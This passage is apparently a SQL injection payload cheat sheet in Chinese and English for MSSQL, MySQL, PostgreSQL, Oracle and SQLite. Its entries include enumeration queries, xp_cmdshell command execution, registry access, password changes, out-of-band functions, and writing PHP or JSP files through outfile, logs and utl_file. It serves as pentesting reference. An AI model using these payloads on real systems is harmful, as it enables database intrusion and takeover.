&lt;li&gt;&lt;code&gt;SELECT user&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用户权限&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;select IS_SRVROLEMEMBER(&#39;sysadmin&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;select IS_SRVROLEMEMBER(&#39;db_owner&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;List User&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SELECT name FROM master..syslogins&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数据库信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT name FROM master..sysdatabases&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;select concat_ws(table_schema,table_name,column_name) from information_schema.columns&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;select quotename(name) from master..sysdatabases FOR XML PATH(&#39;&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;执行命令&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;EXEC xp_cmdshell &#39;net user&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Ascii&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT char(0x41)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT ascii(&#39;A&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT char(65)+char(66)&lt;/code&gt;  =&amp;gt; return  &lt;code&gt;AB&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Delay&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;WAITFOR DELAY &#39;0:0:3&#39;&lt;/code&gt;  pause for 3 seconds&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Change Password&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ALTER LOGIN [sa] WITH PASSWORD=N&#39;NewPassword&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Trick&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;id=1 union:select password from:user&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;文件读取&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;OpenRowset&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;当前查询语句&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;hostname&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用于判断是否站库分离&lt;/li&gt;
&lt;li&gt;&lt;code&gt;select host_name()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;exec xp_getnetname&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;服务器信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;exec xp_msver&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;系统配置&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;select * from sys.configurations;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;注册表读写&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注册表读写&#34;&gt;#&lt;/a&gt; 注册表读写&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;xp_regread&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;exec xp_regread N&#39;HKEY_LOCAL_MACHINE&#39;, N&#39;SYSTEM\CurrentControlSet\Services\MSSEARCH&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;xp_regwrite&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;xp_regdeletvalue&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;xp_regdeletkey&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;xp_regaddmultistring&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;报错注入-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#报错注入-2&#34;&gt;#&lt;/a&gt; 报错注入&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;1=convert(int,(db_name()))&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;常用函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用函数&#34;&gt;#&lt;/a&gt; 常用函数&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;SUSER_NAME()&lt;/li&gt;
&lt;li&gt;USER_NAME()&lt;/li&gt;
&lt;li&gt;PERMISSIONS()&lt;/li&gt;
&lt;li&gt;DB_NAME()&lt;/li&gt;
&lt;li&gt;FILE_NAME()&lt;/li&gt;
&lt;li&gt;TYPE_NAME()&lt;/li&gt;
&lt;li&gt;COL_NAME()&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;dns-oob&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dns-oob&#34;&gt;#&lt;/a&gt; DNS OOB&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;fn_xe_file_target_read_file&lt;/li&gt;
&lt;li&gt;fn_get_audit_file&lt;/li&gt;
&lt;li&gt;fn_trace_gettable&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;其他常用存储过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他常用存储过程&#34;&gt;#&lt;/a&gt; 其他常用存储过程&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;sp_execute_external_script&lt;/li&gt;
&lt;li&gt;sp_makewebtask&lt;/li&gt;
&lt;li&gt;sp_OACreate&lt;/li&gt;
&lt;li&gt;sp_OADestroy&lt;/li&gt;
&lt;li&gt;sp_OAGetErrorInfo&lt;/li&gt;
&lt;li&gt;sp_OAGetProperty&lt;/li&gt;
&lt;li&gt;sp_OAMethod&lt;/li&gt;
&lt;li&gt;sp_OASetProperty&lt;/li&gt;
&lt;li&gt;sp_OAStop&lt;/li&gt;
&lt;li&gt;xp_cmdshell&lt;/li&gt;
&lt;li&gt;xp_dirtree&lt;/li&gt;
&lt;li&gt;xp_enumerrorlogs&lt;/li&gt;
&lt;li&gt;xp_enumgroups&lt;/li&gt;
&lt;li&gt;xp_fixeddrives&lt;/li&gt;
&lt;li&gt;xp_getfiledetails&lt;/li&gt;
&lt;li&gt;xp_loginconfig&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;mysql-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mysql-payload&#34;&gt;#&lt;/a&gt; MySQL Payload&lt;/h2&gt;
&lt;h3 id=&#34;常见payload-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见payload-2&#34;&gt;#&lt;/a&gt; 常见 Payload&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Version&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT @@version&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Comment&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT 1 -- comment&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT 1 # comment&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT /*comment*/1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Space&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0x9&lt;/code&gt;   &lt;code&gt;0xa-0xd&lt;/code&gt;   &lt;code&gt;0x20&lt;/code&gt;   &lt;code&gt;0xa0&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Current User&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT user()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT system_user()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT current_role()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;List User&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT user FROM mysql.user&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Current Database&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT database()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;List Database&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT schema_name FROM information_schema.schemata&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;List Tables&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != &#39;mysql&#39; AND table_schema != &#39;information_schema&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;List Columns&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != &#39;mysql&#39; AND table_schema != &#39;information_schema&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;If&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT if(1=1,&#39;foo&#39;,&#39;bar&#39;);&lt;/code&gt;  return &#39;foo&#39;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Ascii&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;`SELECT char(0x41)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT ascii(&#39;A&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT 0x414243&lt;/code&gt;  =&amp;gt; return  &lt;code&gt;ABC&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Delay&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sleep(1)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT BENCHMARK(1000000,MD5(&#39;A&#39;))&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Read File&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;select @@datadir``select load_file(&#39;databasename/tablename.MYD&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Blind&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ascii(substring(str,pos,length)) &amp;amp; 32 = 1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Error Based&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;select count(*) from (select 1 union select null union select !1)x group by concat((select table_name from information_schema.tables limit 1),floor(rand(0)*2))&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Change Password&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;mysql -uroot -e &amp;quot;use mysql;UPDATE user SET password=PASSWORD(&#39;newpassword&#39;) WHERE user=&#39;root&#39;;FLUSH PRIVILEGES;&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;报错注入常见函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#报错注入常见函数&#34;&gt;#&lt;/a&gt; 报错注入常见函数&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;extractvalue&lt;/li&gt;
&lt;li&gt;updatexml&lt;/li&gt;
&lt;li&gt;GeometryCollection&lt;/li&gt;
&lt;li&gt;linestring&lt;/li&gt;
&lt;li&gt;multilinestring&lt;/li&gt;
&lt;li&gt;multipoint&lt;/li&gt;
&lt;li&gt;multipolygon&lt;/li&gt;
&lt;li&gt;polygon&lt;/li&gt;
&lt;li&gt;exp&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;写文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#写文件&#34;&gt;#&lt;/a&gt; 写文件&lt;/h3&gt;
&lt;h4 id=&#34;写文件前提&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#写文件前提&#34;&gt;#&lt;/a&gt; 写文件前提&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;root 权限&lt;/li&gt;
&lt;li&gt;知晓文件绝对路径&lt;/li&gt;
&lt;li&gt;写入的路径存在写入权限&lt;/li&gt;
&lt;li&gt;secure_file_priv 允许向对应位置写入&lt;/li&gt;
&lt;li&gt;&lt;code&gt;select count(file_priv) from mysql.user&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;基于into写文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于into写文件&#34;&gt;#&lt;/a&gt; 基于 into 写文件&lt;/h4&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;into&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;outfile&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/tmp/demo.txt&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;into&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;dumpfile&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/tmp/demo.txt&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;dumpfile 和 outfile 不同在于，outfile 会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏&lt;/p&gt;
&lt;h4 id=&#34;基于log写文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于log写文件&#34;&gt;#&lt;/a&gt; 基于 log 写文件&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;show variables like &#39;%general%&#39;;
set global general_log = on;
set global general_log_file = &#39;/path/to/file&#39;;
select &#39;&amp;lt;?php var_dump(&amp;quot;test&amp;quot;);?&amp;gt;&#39;;
set global general_log_file = &#39;/original/path&#39;;
set global general_log = off;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;postgressql-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#postgressql-payload&#34;&gt;#&lt;/a&gt; PostgresSQL Payload&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Version
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT version()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Comment
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT 1 -- comment``SELECT /*comment*/1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Current User
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT user&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT current_user&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;``SELECT session_user`&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT getpgusername()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;List User
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT usename FROM pg_user&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Current Database
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT current_database()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;List Database
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT datname FROM pg_database&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ascii
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT char(0x41)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT ascii(&#39;A&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Delay
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;pg_sleep(1)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;oracle-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#oracle-payload&#34;&gt;#&lt;/a&gt; Oracle Payload&lt;/h2&gt;
&lt;h3 id=&#34;常见payload-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见payload-3&#34;&gt;#&lt;/a&gt; 常见 Payload&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;dump&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from v$tablespace;``select * from user_tables;``select column_name from user_tab_columns where table_name = &#39;table_name&#39;;``select column_name, data_type from user_tab_columns where table_name = &#39;table_name&#39;;``SELECT * FROM ALL_TABLES&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Comment&lt;/p&gt;
&lt;p&gt;&lt;code&gt;--``/**/&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Space&lt;/p&gt;
&lt;p&gt;&lt;code&gt;0x00&lt;/code&gt;   &lt;code&gt;0x09&lt;/code&gt;   &lt;code&gt;0xa-0xd&lt;/code&gt;   &lt;code&gt;0x20&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;报错&lt;/p&gt;
&lt;p&gt;&lt;code&gt;utl_inaddr.get_host_name``ctxsys.drithsx.sn``ctxsys.CTX_REPORT.TOKEN_TYPE``XMLType``dbms_xdb_version.checkin``dbms_xdb_version.makeversioned``dbms_xdb_version.uncheckout``dbms_utility.sqlid_to_sqlhash``ordsys.ord_dicom.getmappingxpath``utl_inaddr.get_host_name``utl_inaddr.get_host_address&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;OOB&lt;/p&gt;
&lt;p&gt;&lt;code&gt;utl_http.request``utl_inaddr.get_host_address``SYS.DBMS_LDAP.INIT``HTTPURITYPE``HTTP_URITYPE.GETCLOB&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;绕过&lt;/p&gt;
&lt;p&gt;&lt;code&gt;rawtohex&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;写文件-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#写文件-2&#34;&gt;#&lt;/a&gt; 写文件&lt;/h3&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;create&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;replace&lt;/span&gt; directory TEST_DIR &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/path/to/dir&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;grant&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;write&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;on&lt;/span&gt; directory TEST_DIR &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; system&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;declare&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   isto_file utl_file&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;file_type&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;begin&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   isto_file :&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; utl_file&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fopen&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;TEST_DIR&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test.jsp&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;W&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   utl_file&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;put_line&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;isto_file&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;% out.println(&#34;test&#34;); %&gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   utl_file&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fflush&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;isto_file&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   utl_file&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fclose&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;isto_file&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;sqlite3-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sqlite3-payload&#34;&gt;#&lt;/a&gt; SQLite3 Payload&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Comment
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;--&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/**/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Version
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;select sqlite_version();&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Command Execution&lt;/p&gt;
